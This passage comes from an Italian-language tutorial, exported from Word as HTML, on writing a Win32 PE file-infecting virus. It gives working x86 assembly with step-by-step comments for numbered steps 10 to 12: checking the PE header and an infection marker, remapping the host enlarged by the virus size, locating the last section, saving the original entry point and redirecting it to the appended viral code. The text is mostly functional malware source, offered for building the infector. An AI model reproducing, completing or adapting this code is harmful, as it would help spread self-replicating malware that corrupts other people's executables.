<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; IL FILE E’ UN
PE ? E’ GIA’ STATO INFETTATO ?<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Dato che
abbiamo l’indirizzo di inzio mappatura in EAX, ricaviamo il puntatore
all’header PE header <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;
(MapAddress+3Ch), e lo normalizziamo, così in ESI avremo il puntatore
all’header PE. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; controlliamo se
tutto è ok, quindi controlliamo per la segnatura ‘PE’ e se il file è già stato
infettato.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; controllando la
presenza di una marcatura all’offset 4Ch, non utilizzato dal programma. Se non
c’è <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; marcatura,
continuiamo. Successivamente salviamo nello stack il File Alignment<span
style="mso-spacerun: yes">  </span>e quindi unmappiamo <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; la mappatura e
chiudiamo l’handle di mapping. Finalmente riprendiamo dallo stack il File
Alignment <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; e lo inseriamo
in ECX <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------</span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>eax,dword ptr [ebp+WFD_nFileSizeLow] ; mappa di nuovo<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>add<span style="mso-spacerun: yes">    
</span>eax,virus_size<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>call<span style="mso-spacerun: yes">    </span>Align<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>xchg<span style="mso-spacerun: yes">    </span>ecx,eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>call<span style="mso-spacerun: yes">    </span>CreateMap<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>or<span
style="mso-spacerun: yes">      </span>eax,eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>jz<span
style="mso-spacerun: yes">      </span>CloseFile<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span><span
style="mso-spacerun: yes">   </span>mov<span style="mso-spacerun: yes">    
</span>dword ptr [ebp+MapHandle],eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>mov<span style="mso-spacerun: yes">     </span>ecx,dword ptr
[ebp+NewSize]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>call<span style="mso-spacerun: yes">    </span>MapFile<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>or<span
style="mso-spacerun: yes">      </span>eax,eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>jz<span
style="mso-spacerun: yes">      </span>UnMapFile<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>mov<span style="mso-spacerun: yes">     </span>dword ptr
[ebp+MapAddress],eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>mov<span style="mso-spacerun: yes">     </span>esi,[eax+3Ch]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>add<span style="mso-spacerun:
yes">     </span>esi,eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; 10)<span
style="mso-spacerun: yes">  </span>SOMMA FILE + VIRUS. MAPPA LA SOMMA<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; dato che
abbiamo il File Alignment in ECX (preparato per la funzione 'Align', che
richiede il<span style="mso-spacerun: yes">  </span>valore del <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; fattore di
allineamento in ECX mettiamo in EAX la misura (la somma delle misure) del file
aperto più la <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; misura del
virus (EAX è il numero da allineare), quindi chiamiamo la funzione 'Align' che
ritorna il <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; valore
allineati in EAX. Per esempio, se il fattore di allineamento è 200h, e la
misura File Size+Virus <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; è 12345h, il
numero che ritornerà dalla funzione 'Align' sarà 12400h. Quindi moettiamo in
ECX <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; il numero
allineato.Chiamiamo poi<span style="mso-spacerun: yes">  </span>di nuovo
CreateMap. ma ora mappiamo la misura del file allineata.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Infine
rimettiamo in ESI il puntatore al PE header.<span style="mso-spacerun:
yes">                   </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>edi,esi<span style="mso-spacerun: yes">             </span><span
style="mso-spacerun: yes">            </span>; EDI = ESI = Ptr all’header PE<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>movzx<span style="mso-spacerun:
yes">   </span>eax,word ptr [edi+06h]<span style="mso-spacerun: yes">         
</span>; AX = n. di sezioni<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:FR'>dec<span style="mso-spacerun: yes">     </span>eax<span
style="mso-spacerun: yes">                             </span>; AX--<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:FR'><span style="mso-spacerun: yes">        </span>imul<span
style="mso-spacerun: yes">    </span>eax,eax,28h<span style="mso-spacerun:
yes">                     </span>; EAX = AX*28<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:FR'><span style="mso-spacerun: yes">        </span>add<span
style="mso-spacerun: yes">     </span>esi,eax<span style="mso-spacerun: yes"> 
</span><span style="mso-spacerun: yes">                       </span>;
Normalizza<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:FR'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>add<span style="mso-spacerun: yes">     </span>esi,78h<span
style="mso-spacerun: yes">                         </span>; Ptr alla dir table<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>edx,[edi+74h]<span style="mso-spacerun:
yes">                   </span>; EDX = n. di dir entries<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>shl<span style="mso-spacerun:
yes">     </span>edx,3<span style="mso-spacerun:
yes">                           </span>; EDX = EDX*8<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>add<span style="mso-spacerun: yes">   
</span><span style="mso-spacerun: yes"> </span>esi,edx<span
style="mso-spacerun: yes">                         </span>; ESI = Ptr
all’ultima sezione<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; 11) SPOSTA IL
PUNTATORE ALL’ULTIMA SEZIONE DEL FILE<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Facciamo che
anche EDI punti al PE header. Quindi mettiamo in AX il numero delle sezioni
(una <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; WORD), e lo
dcrementiamo. Poi moltiplichiamo il contenuto di AX (numero di sezioni-1 –
dobbiamo <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; puntare
all’heder dell’ultima sezione, non oltre !) per 28h (la misura in bytes del
section header) e quindi<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; aggiungiamo ad
essa l’offset del PE header. Successivamente facciamo in modo che ESI punti
alla<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; dir table, e
mettiamo EDX il numero delle entries della dir. Poi moltiplichiamo tale valore
per 8, e <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; finalmente aggiungiamo
il risultato (in EDX) a ESI, così ESI punterà all’ultima sezione.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>eax,[edi+28h]<span style="mso-spacerun:
yes">                   </span>; ricava EP<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">   </span><span style="mso-spacerun:
yes">     </span>mov<span style="mso-spacerun: yes">     </span>dword ptr
[ebp+OldEIP],eax<span style="mso-spacerun: yes">      </span>; lo salva<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>eax,[edi+34h]<span style="mso-spacerun:
yes">                   </span>; ricava imagebase<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>dword ptr [ebp+ModBase],eax<span style="mso-spacerun:
yes">     </span>; lo salva<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>edx,[esi+10h]<span style="mso-spacerun:
yes">                   </span>; EDX = SizeOfRawData<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>ebx,edx<span style="mso-spacerun:
yes">                         </span>; EBX = EDX<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>add<span style="mso-spacerun:
yes">     </span>edx,[esi+14h]<span style="mso-spacerun:
yes">                   </span>; EDX = EDX+PointerToRawData<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>push<span style="mso-spacerun:
yes">    </span>edx<span style="mso-spacerun: yes">                            
</span>; salva EDX<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>eax,ebx<span style="mso-spacerun:
yes">                         </span>; EAX = EBX<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>add<span style="mso-spacerun:
yes">     </span>eax,[esi+0Ch]<span style="mso-spacerun:
yes">                   </span>; EAX = EAX+VA Address<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">                                               
</span>; EAX = New EIP<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>[edi+28h],eax<span style="mso-spacerun:
yes">                   </span>; Cambia il<span style="mso-spacerun: yes"> 
</span>nuovo EIP<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>dword ptr [ebp+NewEIP],eax<span style="mso-spacerun:
yes">      </span>; e lo salva<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; 12) AGGIORNA
I<span style="mso-spacerun: yes">  </span>VALORI DELLA SEZIONE<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Innanzitutto
mettiamo in EAX l’ EIP del file che stiamo infettando (l’host-disco) mettiamo
il vecchio<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;<span
style="mso-spacerun: yes">  </span>EIP in una variabile che utilizzeremo
all’inizio del virus. Facciamo lo stesso con la imagebase. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Dopo di ciò,
mettiamo in EDX la SizeOfRawData dell’ultima sezione, la manteniamo per dopo in<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; EBX, e infine
aggiungiamo a EDX il PointerToRawData (EDX sarà utilizzato più tardi quando
copiamo il virus, così lo <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;salviamo nello
stack). Dopo mettiamo in EAX la SizeOfRawData, aggiungiamo ad <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
